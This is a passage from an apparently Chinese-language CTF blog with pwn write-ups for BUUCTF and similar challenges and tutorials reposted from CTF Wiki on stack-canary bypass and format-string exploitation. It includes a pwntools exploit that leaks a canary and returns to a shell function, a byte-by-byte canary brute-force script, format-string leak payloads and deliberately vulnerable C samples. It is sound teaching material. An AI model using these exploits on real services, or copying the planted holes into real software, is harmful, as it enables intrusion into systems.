<h3 id="二、get-started-3dsctf-2016"><a href="#二、get-started-3dsctf-2016" class="headerlink" title="二、get_started_3dsctf_2016"></a>二、get_started_3dsctf_2016</h3><p>老规矩，下载完附件，checksec一下：<img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162136.png"></p>
<p>看起来没什么，ida查看一下，</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162232.png"></p>
<p>很简单，而且溢出点也十分明显，直接get无限输入了</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162344.png"></p>
<p>似乎还很好地存在了后门函数，flag就在眼前？？？当然不可能！</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162512.png"></p>
<p>当你把exp写成这样的时候（不是写的，我写的在发现不行就给删了，懒得再写，百度上拿来的），只能在本机上才能顺利执行，在一个地方看到，说是因为远程会被过滤，把获取flag的地址过滤。所以此时只能换一种方式进行攻击，手握无限输入，不必太慌张。</p>
<p>有这么一个函数*<em>int mprotect(const void <em>start, size_t len, int prot)</em></em> 用来修改内存的权限的，第一个参数是修改内存的起始地址，第二个是修改地址的长度，第三个是权限值（可读为4，可写2，可执行为1，即是rwx 7），我们就要利用这个函数，找到一块较大的内存地址，进行修改权限，然后再调用read函数对这块内存输入shellcode，最后调转执行shellcode！</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163230.png"></p>
<p>在gdb里面输入vmmap指令可以查看地址的权限，这里我们选择可读可写的0x080ea00作为起始地址。</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163331.png"></p>
<p>在写payload需注意，这里不用覆盖ebp，我也不知道为什么。。但是ida里面确实是这样的。最后的exp如下：</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163334.png"></p>
<p>其中的pop_3可以通过ROPgadget查询得到，使用这个是因为要保持堆栈平衡，使得程序正常运行。我们在构建mprotect和read函数时，需要不断的返回程序，所以这里需要比平常的多出pop这个指令，用来清理我们输入栈里的三个参数，达到堆栈平衡。这个看作是一个比较特殊的返回地址，不仅可以返回控制eip执行栈上的指令，还要顺带的清理我们多输入的参数，保证esp指向的位置始终不变化</p>
<h3 id="三、ciscn-2019-en-2"><a href="#三、ciscn-2019-en-2" class="headerlink" title="三、ciscn_2019_en_2"></a>三、ciscn_2019_en_2</h3><p>先checksec一下附件</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404194652.png"></p>
<p>开启了relro和nx，比较常见的保护措施。运行一下看看有什么东西</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195052.png"></p>
<p>输入2直接无限循环了，毫无意义，输入3退出，输入1似乎会经过一些的运算还是什么，进入ida看看</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195229.png"></p>
<p>跟运行并无太大差别，只有详细看看1的函数里面有没有什么漏洞。当看到__int16 v3，还以为可能出现整数溢出，可惜就是我想多了</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195357.png"></p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195534.png"></p>
<p>这里有一个无限输入，可以很轻易覆盖到返回地址，由于附件里面没有后门函数，很明显的rop了</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195804.png"></p>
<p>因为要真正能到退栈进行地址跳转，就要先把整个函数的程序流执行完毕才能发生退栈。这里绕过就是因为strlen()遇到’\0’就会停止，利用这点可以直接退出循环，在这题里面还有个需要注意的点就是这里的代码</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404202418.png"></p>
<p>这里还有两个输出，需要接收了，否则会影响got表的泄露，exp如下：</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404202427.png"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>canary绕过</title>
    <url>/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf wiki"></a>转载自ctf wiki</h2><h1 id="一、Canary"><a href="#一、Canary" class="headerlink" title="一、Canary"></a>一、Canary</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
<p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法(栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行(栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>
<p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p>
<p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p>
<p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p>
<h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 GCC 中使用以下参数设置 Canary:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-strong</span><br><span class="hljs-deletion">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="hljs-deletion">-fno-stack-protector 禁用保护</span><br></code></pre></td></tr></table></figure>

<h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 Canary 保护的 stack 结构大概如下：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">  High<br>  Address |<span class="hljs-string">                 </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> args            </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> return address  </span>|<br>          +-----------------+<br>  rbp =&gt;  |<span class="hljs-string"> old ebp         </span>|<br>          +-----------------+<br>rbp-8 =&gt;  |<span class="hljs-string"> canary value    </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> local variables </span>|<br>  Low     |<span class="hljs-string">                 </span>|<br>  Address<br><br></code></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中ebp-0x8 的位置。<br>这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>

<p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容(参见 stack smash)。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-keyword">dtv_t</span> *dtv;<br>  <span class="hljs-keyword">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-keyword">int</span> multiple_threads;<br>  <span class="hljs-keyword">uintptr_t</span> sysinfo;<br>  <span class="hljs-keyword">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-keyword">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">security_init</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br>  <br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br><br></code></pre></td></tr></table></figure>


<h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p>
<h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。<br>泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。<br>这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>
<h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// ex2.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getshell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-built_in">printf</span>(buf);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    init();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello Hacker!&quot;</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ gcc -m32 -no-pie ex2.c -o ex2<br></code></pre></td></tr></table></figure>

<p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary<br>之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;ex2&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./ex2&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./ex2&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同(相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且<br>通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。<br>在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:<br>这是爆破的 Python 代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>


<h3 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
<p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p>
<h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
<p>参见 StarCTF2018 babystack</p>
<h1 id="二、例题"><a href="#二、例题" class="headerlink" title="二、例题"></a>二、例题</h1><h3 id="pwn04——来自ctfshow的pwn入门"><a href="#pwn04——来自ctfshow的pwn入门" class="headerlink" title="pwn04——来自ctfshow的pwn入门"></a>pwn04——来自ctfshow的pwn入门</h3><p>checksec一下<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155307.png"></p>
<p>开启了nx，canary，部分relro等保护措施，</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155500.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155325.png"></p>
<p>运行一下附件，发现可以把你输入的东西打印出来，还是重复两次，因此可以借此把canary泄露出来。（其实应该也看出来了吧，这里也有着很明显的字符串漏洞，所以还有一种解法就是去算canary的相对字符串的偏移，然后把它泄露出来）进入ida，函数很少，左边也能发现给出了系统函数，说明只要能正常覆盖返回地址就可以获取shell，点开buf进入栈中查看到canary的位置</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155329.png"></p>
<p>计算一下buf到var_c的偏移，覆盖到Var_C的最后一位数，因为是0x00会造成截断，所以一同覆盖，到时候减去覆盖的值就行了</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328161657.png"></p>
<p>其实这题貌似就是上面当做例题的题目，可能是出题人也读过ctf wiki并且照着样子出的，tql！</p>
<h3 id="Mary-Morton——来自攻防世界进阶区"><a href="#Mary-Morton——来自攻防世界进阶区" class="headerlink" title="Mary_Morton——来自攻防世界进阶区"></a>Mary_Morton——来自攻防世界进阶区</h3><p>checksec 一下，查看保护<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328165236.png"></p>
<p>开启了部分relro，nx，canary</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328170729.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180109.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180112.png"></p>
<p>首先，主函数是个无限的循环结构，不停的可以进入三个分支，在第二个分支中有着字符串漏洞，第三个分支中有着栈溢出漏洞，如果只是简单处理，那就是先用字符串漏洞泄露canary的值，再用栈溢出进行跳转获取flag</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328175843.png"></p>
<p>在gdb中断点到printf中可以算出，canary是栈上的第18个变量，以及64位传参中前六个是寄存器传参，所以canary相对于字符串是第23个参数，也就是要写成%23$p，然后就正常算栈溢出偏移即可。exp如下：</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328185226.png"></p>
<p>但是我在攻防世界的wp中看见，有个大佬还拥有其他两个方式，方式1:输入2，利用格式化字符串将printf的got地址修改为system的plt地址，再次输入2，输入’/bin/sh\x00’，相当于执行system(‘/bin/sh\x00’)方式2:输入2，利用格式化字符串将exit的got地址修改为sub_4008DA函数地址（该函数可以直接执行cat./flag）,再次输入3，调用sub_4008DA函数catflag。详细可以到攻防世界自行查看，到大佬tql！！！！！！</p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞利用</title>
    <url>/2021/03/27/2021-03-27-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf-wiki"></a>转载自ctf-wiki</h1><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p>
<ul>
<li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li>
<li>查看进程内容，根据%d，%f输出了栈上的内容。</li>
</ul>
<p>下面我们会对于每一方面进行更加详细的解释。</p>
<h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个%s即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure>

<p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
<ul>
<li>泄露栈内存<ul>
<li>  获取某个变量的值</li>
<li>  获取某个变量对应地址的内存</li>
</ul>
</li>
<li>泄露任意地址内存<ul>
<li>  利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li>
<li>  盲打，dump整个程序，获取有用信息。</li>
</ul>
</li>
</ul>
<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>例如，给定如下程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后，我们简单编译一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br>leakmemory.c: In function ‘main’:<br>leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]<br>   printf(s);<br>          ^<br></code></pre></td></tr></table></figure>

<p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。</p>
<p>根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数(64位会根据其传参的规则进行获取)。这里我们主要介绍32位。</p>
<h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure>

<p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用GDB来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p>
<p>首先，启动程序，将断点下载printf函数处</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure>

<p>之后，运行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure>

<p>此时，程序等待我们的输入，这时我们输入%08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p>
